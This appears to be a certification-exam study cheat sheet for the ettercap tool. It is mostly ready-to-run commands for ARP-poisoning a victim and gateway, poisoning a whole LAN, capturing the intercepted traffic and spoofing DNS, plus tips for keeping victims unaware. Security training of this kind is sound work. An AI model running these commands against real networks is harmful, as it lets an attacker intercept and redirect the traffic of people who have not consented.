# ettercap — classic MITM / ARP poisoner

> **The textbook MITM tool.** For CEH, you'll use it to ARP-poison a victim and a gateway so all their traffic flows through you, then sniff it in Wireshark. It has a GUI (`-G`), a curses UI (`-C`), and a text mode (`-T`). Exam questions almost always use text mode.

**Install check (Parrot — already installed):** `ettercap -v`

**Needs root.**

---

## 🎯 Cheat-flow: ARP-poison MITM in one line

| Step | Command | What happens |
|---|---|---|
| 0. Enable IP forwarding | `sudo sysctl -w net.ipv4.ip_forward=1` | You become a router |
| 1. Identify victim + gateway | `ip n` / `arp -a` | Get both MACs/IPs |
| 2. **Poison** with ettercap | `sudo ettercap -T -i eth0 -M arp /<VICTIM>// /<GATEWAY>//` | Bidirectional poisoning |
| 3. Sniff in Wireshark | filter `ip.addr == <VICTIM>` | Watch the traffic |
| 4. Stop cleanly (q) | press `q` inside ettercap | Re-ARPs targets to fix |

---

## 🔑 Flags you must know cold

### UI mode (pick one)
| Flag | Mode |
|---|---|
| `-T` | **Text mode** (what you want for exam CLI) |
| `-C` | Curses interactive UI |
| `-G` | GTK GUI |
| `-D` | Daemon (no UI) |

### Core flags
| Flag | Meaning |
|---|---|
| `-i <iface>` | Interface to use |
| `-M <method>` | **Start a MITM attack**: `arp`, `arp:remote`, `icmp`, `dhcp`, `port`, `ndp` |
| `-q` | Quiet — don't print captured packets to screen |
| `-w <file.pcap>` | Write captured packets to pcap |
| `-r <file.pcap>` | Read from pcap (offline analysis) |
| `-P <plugin>` | Load a plugin (e.g. `dns_spoof`, `autoadd`, `find_ettercap`) |
| `-F <file>` | Load filter (etterfilter-compiled `.ef`) |
| `-L <file>` | Log to file |
| `-o` | Only run MITM, no sniff |
| `-m <file>` | Log messages |
| `-V <format>` | Visualization: `ascii`, `hex`, `text`, `ebcdic`, `html`, `utf8` |

---

## 🔑 Target syntax — the `/MAC/IP/PORT/` format

Targets are two groups separated by a space. Each target is `/MAC/IPs/PORTs/` — empty fields mean "any."

| Target string | Meaning |
|---|---|
| `/10.10.10.5//` | IP 10.10.10.5, any MAC, any port |
| `///80` | Anyone on port 80 |
| `/10.10.10.5/aa:bb:cc:dd:ee:ff/80,443` | Specific host, MAC, and ports |
| `// //` | Empty (whole subnet) — use with caution |
| `/10.10.10.5// /10.10.10.1//` | **Victim and gateway** (classic MITM) |

---

## 🔑 ARP poisoning MITM

```bash
sudo ettercap -T -q -i eth0 -M arp:remote /10.10.10.5// /10.10.10.1//
```

- `-T` text mode, `-q` quiet
- `-M arp:remote` poisons both directions; `arp` alone only poisons outbound
- First target is the **victim**, second is the **gateway**
- Press `h` inside ettercap for interactive help, `q` to quit (sends clean ARPs)

### Variants
```bash
# Whole LAN (dangerous — everyone's ARP pointing at you)
sudo ettercap -T -q -i eth0 -M arp:remote // //

# Write captured traffic to pcap while MITMing
sudo ettercap -T -q -i eth0 -w mitm.pcap -M arp:remote /10.10.10.5// /10.10.10.1//

# DNS spoof plugin (redirect victim's DNS lookups)
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /10.10.10.5// /10.10.10.1//
# (edit /etc/ettercap/etter.dns first)
```

---

## 🔑 Useful plugins (`-P`)

| Plugin | Purpose |
|---|---|
| `dns_spoof` | Forge DNS responses (see `/etc/ettercap/etter.dns`) |
| `autoadd` | Auto-add new hosts to the victim list |
| `find_ettercap` | Detect other ettercap instances on LAN |
| `chk_poison` | Verify your poisoning is actually working |
| `repoison_arp` | Re-poison if ARP tables get refreshed |
| `isolate` | Isolate a host from the LAN |
| `remote_browser` | See URLs the victim visits |

List all plugins: `ettercap -P list`

---

## 📋 Command recipes (copy-paste)

```bash
# 1. Enable forwarding so victim's traffic actually reaches the gateway
sudo sysctl -w net.ipv4.ip_forward=1

# 2. Scan the subnet, auto-build host list, then MITM victim + gateway
sudo ettercap -T -q -i eth0 -M arp:remote /10.10.10.5// /10.10.10.1//

# 3. Same but write pcap for Wireshark
sudo ettercap -T -q -i eth0 -w mitm.pcap -M arp:remote /10.10.10.5// /10.10.10.1//

# 4. DNS spoofing — first edit /etc/ettercap/etter.dns:
#    *   A   10.10.14.3
echo '* A 10.10.14.3' | sudo tee -a /etc/ettercap/etter.dns
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /10.10.10.5// /10.10.10.1//

# 5. Scan for hosts first (inside ettercap type: h, then 'L' lists hosts)
sudo ettercap -T -q -i eth0 /// ///

# 6. Offline pcap analysis (no capture, read-only)
sudo ettercap -T -r captured.pcap

# 7. Plugin list
ettercap -P list

# 8. Restore: just press q inside ettercap — it broadcasts correct ARPs
```

### Interactive keys (text mode)
| Key | Action |
|---|---|
| `h` | Help |
| `l` | List hosts |
| `v` | Toggle visualization method |
| `q` | Quit (sends cleanup ARPs) |
| `p` | Plugin menu |
| `s` | Stats |

---

## ⚠️ Gotchas

- **IP forwarding must be on** — otherwise you black-hole the victim's traffic and they notice. `sysctl -w net.ipv4.ip_forward=1`.
- **Always `arp:remote`, not `arp`**, unless you know you only need one-way. `arp:remote` is full bidirectional.
- **Quit cleanly with `q`** — ettercap broadcasts correct ARPs to un-poison. If you kill the process, victims stay broken for a few minutes.
- **Target syntax is `/MAC/IP/PORT/`**, not comma-separated. Two slashes = "any" for that field.
- **HTTPS traffic will still be encrypted** — MITM gets you the packets, not the plaintext. Use [bettercap](bettercap.md)'s `sslstrip` caplet or `mitmproxy` for TLS interception.
- **Scan subnet first** (or pass targets explicitly) — otherwise ettercap doesn't know who to poison.
- **`autoadd` plugin** is your friend if new hosts join the LAN during the attack.
- **`arp -a` on the victim** should show the gateway's IP with *your* MAC — that's how you verify poisoning is active. Or use the `chk_poison` plugin.
- **Modern networks** with dynamic ARP inspection (DAI) on switches will drop poisoned ARPs. Exam labs don't enable this.
- **ettercap is older** — [bettercap](bettercap.md) is the modern replacement and supports HSTS bypass, wifi attacks, BLE, and a web UI. Know both; exam may ask for either.

---

## 🔗 Related

- [bettercap](bettercap.md) — the modern replacement
- [wireshark](wireshark.md) — analyze the traffic you just intercepted
- [tcpdump](tcpdump.md) — lightweight capture alternative
- [08-sniffing domain README](../08-sniffing/README.md)
- [MITM playbook](../playbooks/mitm-playbook.md)
